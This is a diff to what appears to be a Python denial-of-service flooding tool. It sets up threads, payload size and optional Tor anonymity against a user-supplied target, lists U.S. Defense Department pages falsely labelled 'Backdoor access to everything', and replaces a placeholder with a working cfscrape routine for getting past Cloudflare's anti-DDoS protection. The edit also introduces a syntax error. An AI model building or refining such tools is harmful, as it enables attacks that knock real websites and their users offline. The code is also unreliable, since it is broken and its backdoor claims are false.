@@ -30,13 +30,15 @@
  from stem.util.log import get_logger
  import urllib3
  from urllib.parse import urlparse
+ import cfscrape #Bypass Cloudflare
+ from contextlib import suppress
  
 
  # Configuration
  TARGET = sys.argv[1] if len(sys.argv) > 1 else input("\033[32mEnter target URL: \033[0m")  # Dark Green
  parsed_url = urlparse(TARGET)
  PORT = int(sys.argv[2]) if len(sys.argv) > 2 else (443 if parsed_url.scheme == 'https' else 80)
- THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 500
+ THREADS = int(sys.argv[3]) if len(sys.argv] > 3 else 500
  PAYLOAD_SIZE = int(sys.argv[4]) if len(sys.argv) > 4 else 1024
  TIMEOUT = 5
  USE_TOR = input("\033[32mUse Tor proxy? (y/n): \033[0m").lower() == 'y'  # Dark Green
@@ -421,9 +423,7 @@
   "https://www.defense.gov/About-DOD/Open-Government/",  # Backdoor access to everything
   "https://www.defense.gov/About-DOD/Small-Business-Program/",  # Backdoor access to everything
   "https://www.defense.gov/About-DOD/Science-Technology/",  # Backdoor access to everything
-  #The below link does not exist.
   #"http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip", # Grab Google Servers and get the IP
-  #The below link does not exist.
   #"https://fuckyou.bigmancozmo.com/",  # Personal Webpage Backdoor Access
  ]
  
@@ -435,36 +435,28 @@
  # Function to bypass Cloudflare's Anti-DDoS measures
  def bypass_cloudflare(url):
   try:
-  # Use a real browser's User-Agent
-  headers = {
-  'User-Agent': random.choice(USER_AGENTS)
-  }
+  # Use cfscrape to bypass Cloudflare
+  scraper = cfscrape.create_scraper()
+  response = scraper.get(url, timeout=10)
  
 
-  # Make a request to the target URL
-  response = requests.get(url, headers=headers, timeout=10)
- 
-
-  # Check if Cloudflare's anti-DDoS page is present
-  if 'cloudflare' in response.text.lower() or response.status_code == 503:
-  log("\033[33mCloudflare detected, attempting to bypass...\033[0m")  # Dark Yellow
- 
-
-  # Attempt to solve Cloudflare's JavaScript challenge
-  # You may need to use a library like `cloudflare-scrape` or implement your own solver
-  # Note: Bypassing Cloudflare is complex and may require continuous updates
-  # to the bypass method as Cloudflare evolves.
-  # Here's a placeholder for the bypass logic:
-  # solved_response = cloudflare_scrape.get(url, headers=headers, timeout=10)
- 
-
-  # Placeholder to show bypass attempt
-  log("\033[33mCloudflare bypass attempt completed.\033[0m")  # Dark Yellow
-  return True  # Return True if bypass is successful
-  return False  # Return False if no Cloudflare detected
+  # Check if the request was successful
+  if response.status_code == 200:
+  log("\033[32mSuccessfully bypassed Cloudflare.\033[0m")  # Dark Green
+  return True
+  else:
+  log(f"\033[31mFailed to bypass Cloudflare. Status code: {response.status_code}\033[0m")  # Dark Red
+  return False
+  except cfscrape.exceptions.CloudflareChallengeError as e:
+  log(f"\033[31mCloudflare challenge error: {e}\033[0m")  # Dark Red
+  return False
   except requests.exceptions.RequestException as e:
   log(f"\033[31mRequest error: {e}\033[0m")  # Dark Red
-  return False  # Return False if request error occurred
+  return False
+  except Exception as e:
+  log(f"\033[31mAn unexpected error occurred during Cloudflare bypass: {e}\033[0m")
+  log(traceback.format_exc())
+  return False
  
 
  def referer_attack():
